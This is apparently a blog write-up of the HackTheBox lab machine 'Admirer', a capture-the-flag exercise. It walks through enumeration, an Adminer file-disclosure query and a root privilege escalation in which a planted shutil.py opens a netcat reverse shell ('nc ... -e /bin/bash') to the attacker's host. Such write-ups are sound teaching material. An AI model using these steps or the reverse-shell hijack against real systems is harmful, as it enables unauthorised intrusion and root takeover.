<p>Hello everyone!</p>

<p>Today, I'm publishing a new writeup for <a href="https://www.hackthebox.eu">HackTheBox</a>'s box <a href="https://www.hackthebox.eu/home/machines/profile/248">Admirer</a>. This machine was made by <a href="https://www.hackthebox.eu/home/users/profile/159204">polarbearer</a> and <a href="https://www.hackthebox.eu/home/users/profile/125033">GibParadox</a> and while it has been rated easy by its makers, the community seems to have found it rather medium as its difficulty has been rated 5.3/10.<!--more--></p>

<p>This machine was quite interesting: the foothold and user part are rather difficult to get and require a lot of enumeration. The root part, while relying on a well-known security issue, is interesting as well and made me learn a bit more about Python.</p>

<h3>Foothold</h3>

<p>So let's get started. First, as usual we add the IP address of the box into our <code>/etc/hosts</code> file in order to designate the machine by the name <code>admirer.htb</code>. Once this has been done, we run a classical port scan using <code>nmap</code> :</p>
<pre class="prettyprint nocode">
$ nmap -sC -sV -oA nmap/admirer admirer.htb
# Nmap 7.80 scan initiated Sun Sep  6 12:21:03 2020 as: nmap -sC -sV -oA nmap/admirer admirer.htb

# Nmap done at Sun Sep  6 12:21:16 2020 -- 1 IP address (1 host up) scanned in 13.00 seconds
</pre>

<p>As we can see, we have three open ports:</p>
<ul>
    <li>port 21: this is an FTP port that might be useful later;</li>
    <li>port 22: this is an SSH port, it will be useful once we have credentials or an RSA identity file. Note that most of the time there is no useful exploit over this port;</li>
    <li>port 80: an HTTP Apache server is running on this port. <code>nmap</code> already read the <code>robots.txt</code> file and shows us that a directory has been disallowed from being visited by robots: <code>admin-dir</code>. This should be our first clue in order to own this box.</li>
</ul>

<p>The website in itself isn't really interesting, it is a gallery of pictures and quotes. As expected, the <code>robots.txt</code> file looks like that:</p>
<img src="/img/{{ page.code }}/admirer1.png" alt="robots.txt successfully disallows admin-dir" />

<p>This file gives us another info: the administrator might have the username <code>waldo</code>. Browsing to <code>admirer.htb/admin-dir</code> gives us a 403 Forbidden status code, so we will have to find another way to see the contents of this directory.</p>

<p>We're going to try and enumerate the contents of this directory. To do so, we use a tool called <code>gobuster</code><sup><a href="#fn1" id="ref1">1</a></sup>. This software allows us to test the existence of files at a given URL using a wordlist. Moreover, the tool makes use of multithreading which makes it faster than other tools such as <code>dirb</code>.</p>

<p>We will use a wordlist provided by <code>dirb</code>: <code>common.txt</code>. We then launch the following command:</p>
<pre class="prettyprint nocode">
$ gobuster dir -u 'http://admirer.htb/admin-dir/' -w wordlists/common.txt -o gobuster/run.gobuster
</pre>

<p>This command allows us to try every name in the wordlist as a file of <code>admin-dir</code> directory. However, a quick run shows us that <code>gobuster</code> doesn't find anything relevant beside <code>.htaccess</code> and <code>.htpasswd</code> files. The issue here is that the files we are looking for don't have a common extension for the web. Usually, we look for files with <code>.php</code> extension or more web-oriented extensions. As we don't know which extension to look for, we can make use of the <code>extensions_common.txt</code> wordlist from <code>dirb</code>. This file gives 29 common extensions. After having transformed this file in a comma-separated string of extensions, we run <code>gobuster</code> again, and this time with a larger wordlist:</p>
<pre class="prettyprint nocode">
$ gobuster dir -u 'http://admirer.htb/admin-dir/' -w wordlists/big.txt -o gobuster/run.gobuster -x cfm,aspx,txt,nsf,jhtml,xml,c,asp,bat,pl,exe,dll,log,jsp,jsa,cgi,shtml,sh,mdb,htm,php,inc,sql,reg,phtml,html,com
</pre>
<p>The run is obviously longer, but it gives us the result we wanted:</p>
<pre class="prettyprint nocode">
$ cat gobuster/run.gobuster
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
</pre>

<p>We then open both files and we get:</p>

<div class="row">
    <figure class="column">
        <img src="/img/{{ page.code }}/admirer2.png" alt="Content of contacts.txt" />
        <figcaption>Content of <code>contacts.txt</code></figcaption>
    </figure>
    <figure class="column">
        <img src="/img/{{ page.code }}/admirer3.png" alt="Content of credentials.txt" />
        <figcaption>Content of <code>credentials.txt</code></figcaption>
    </figure>
</div>

<p>While <code>contacts.txt</code> is interesting because it gives us names of potential users of the machine, <code>credentials.txt</code> is more interesting as it gives us directly credentials. Moreover, we know that there is an FTP server running on the machine, so the credentials labelled as <code>[FTP account]</code> is certainly going to be useful.</p>

<h3>User part</h3>

<p>We are going to try the credentials we got in the foothold part:</p>
<pre class="prettyprint nocode">
$ fpt admirer.htb
Connected to admirer.htb.
220 (vsFTPd 3.0.3)

331 Please specify the password.

230 Login successful.

ftp>
</pre>

<p>It works! We can now browse and get any interesting files:</p>
<pre class="prettyprint nocode">
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql

226 Directory send OK.

226 Transfer complete.

</pre>

<p>The file <code>dump.sql</code> wasn't very interesting: it presents the SQL requests that have been issued in order to add the pictures of the website to the database. We get here the name of the database which is <code>admirerdb</code>.</p>

<p>The <code>html.tar.gz</code> archive is more interesting: it looks like a backup of the website, including the hidden directories. After having gunzipped and untared it, we get the following files:</p>
<pre class="prettyprint nocode">
$ ls
drwxr-x--- 6 rubytox rubytox    4096  6 juin   2019 assets
drwxr-x--- 4 rubytox rubytox    4096  2 déc.   2019 images
-rw-r----- 1 rubytox rubytox    4613  3 déc.   2019 index.php
-rw-r----- 1 rubytox rubytox     134  1 déc.   2019 robots.txt
drwxr-x--- 2 rubytox rubytox    4096  2 déc.   2019 utility-scripts
drwxr-x--- 2 rubytox rubytox    4096  2 déc.   2019 w4ld0s_s3cr3t_d1r
</pre>
<p>First, let's take a look at <code>index.php</code> page. The file contains:</p>
<pre class="prettyprint linenums">
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
</pre>

<p>We notice an error in the password that can cause a syntax error with PHP, however we do not get this message when we browse directly into the website: this could mean that the file has changed and that the password is not the same now. I tried multiple variations of this password and nothing worked.</p>

<p>The directory <code>w4ld0s_s3cr3t_d1r</code> only contains the two <code>txt</code> files we found earlier. However, the directory <code>utility-scripts</code> contains useful information: it contains files related to database management. Now, it is time to make an educated guess: the name of the box is Admirer, which looks a lot like Adminer<sup><a href="#fn2" id="ref2">2</a></sup>: a PHP file that allows database management in a very easy way. We just need to try whether such a file is present in our server, and it is:</p>
<img src="/img/{{ page.code }}/admirer4.png" alt="adminer.php exists" />

<p>We can also notice that this version of Adminer is outdated: the server runs version 4.6.2 instead of 4.7.7, the latest version. After looking for a little bit, we find that there is an exploit for this version that allows us to query any file the user <code>www-data</code> has access to.</p>

<p>This exploit is documented on <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">sansec.io</a> and works the following way: the <code>adminer.php</code> page allows anyone to connect to their own SQL database, as we can see in the previous screenshot. Then, once connected we can perform a data import request in order to ask the server for a specific local file.</p>

<p>I created a database user on my machine and started Wireshark in order to be able to read all the exchanged messages between my machine and the box. First, I gave Adminer my IP address as well as the credentials to the new user, then I use the "SQL request" screen to type in my own request.</p>

<p>The request we are going to issue is <code>LOAD DATA LOCAL INFILE</code>: it should load a local file and add its data to a specified table in our database. The exploit here comes from the fact that "local" for Adminer means the place where <code>adminer.php</code> is located, thus the targeted box.</p>

<p>A good idea would be to query <code>index.php</code>, as it might contain the current valid credentials as we saw in the backup file. We launch the following request:</p>
<pre class="prettyprint">
LOAD DATA LOCAL INFILE '../index.php'
INTO TABLE testdb.testdb FIELDS
TERMINATED BY "," LINES TERMINATED BY "\n";
</pre>

<p>Then, we right-click on any TCP packet corresponding to the execution of this request in Wireshark and click on "Follow TCP stream": this will reconstitute all the packets that were exchanged and we will get our file. As a matter of fact, we get:</p>
<img src="/img/{{ page.code }}/admirer5.png" alt="The current index.php file" />

<p>We now have the credentials the user uses to connect to the database. We might give those credentials a try with the SSH server as well:</p>
<pre class="prettyprint nocode">
$ ssh waldo@admirer.htb
waldo@admirer.htb's password: <span class="password">&&lt;h5b~yK3F#{PaPB&dA}{H></span>

waldo@admirer:~$ cat user.txt
2c8a9[-- REDACTED --]b5bbf
waldo@admirer:~$
</pre>

<p>We got user! Now on to root part.</p>

<h3>Root part</h3>

<p>One of the first things you should check once you have owned user is which <code>sudo</code> permissions you have. This is performed by the command <code>sudo -l</code> and lists all the commands you can execute as root without having to be in the sudoers group. On this machine, we get the following result:</p>
<pre class="prettyprint nocode">
$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
</pre>

<p>So we see that there is a script in <code>/opt/scripts/</code> that we can execute as root. Let's look at what that script does.</p>

<p>Basically, this script allows the user to perform management tasks on the system: they can backup important files, backup the website, view crontabs for instance. The most interesting part is the following one, this code is executed when we ask for a website backup:</p>
<pre class="prettyprint linenums">
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
</pre>

<p>The script is simple: if we're root, we execute the script <code>/opt/scripts/backup.py</code>, if we're not root it tells us we need to be root. Our permissions allow us to execute this code as root, so we are able to execute <code>backup.py</code>. This file looks like that:</p>
<pre class="prettyprint linenums">
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
</pre>

<p>This file is owned by root, so we can't modify it. However, we can see something quite interesting: the script makes use of a function that is part of the <code>shutil</code> module. In addition, we saw earlier that our permissions to launch <code>admin_tasks.sh</code> script has the <code>SETENV</code> flag set. This means we can not only run the script as root, but also set environment variables while running the script.</p>

<p>To exploit this weakness, we need to understand how modules import work in python. Python3 uses an environment variable called <code>PYTHONPATH</code>: when we import a module, it starts by looking in the paths of this variable if the specified file is found. Thus, it would be very easy to make our own <code>shutil</code> package, put it into <code>PYTHONPATH</code> and then execute <code>backup.py</code> as root.</p>

<p>We start by making a script called <code>shutil.py</code> in <code>/home/waldo/tmp</code>, which content is:</p>
<pre class="prettyprint linenums">
import os
def make_archive(a, b, c):
    os.system("nc 10.10.40.100 1337 -e '/bin/bash'")
</pre>

<p>Then, on our machine we listen on port 1337 by typing:</p>
<pre class="prettyprint nocode">
$ nc -nlvp 1337
</pre>

<p>Then, we execute the following command:</p>
<pre class="prettyprint nocode">
$ sudo PYTHONPATH="/home/waldo/tmp:$PYTHONPATH" /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
</pre>

<p>And eventually, we get in our <code>nc</code> window:</p>
<pre class="prettyprint nocode">
$ nc -nlvp 1337
Connection from 10.10.10.187:59278
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
7dd21[-- REDACTED --]9f65a
</pre>

<p>We got root!</p>

<h3>Conclusion</h3>

<p>I really liked this machine. I had to manipulate a lot of concepts that I'm not used to: the enumeration part was harder than the usual ones because of the extensions, I had to use different tools such as Wireshark for the Adminer part, and the root part was really good as well because I had no idea I could set environment variables while running a command with such permissions.</p>

<p>So this is over for this box! If you have any comments or suggestions, feel free to open an issue on <a href="https://github.com/Rubytox/Rubytox.github.io">this website's GitHub page</a>.</p>
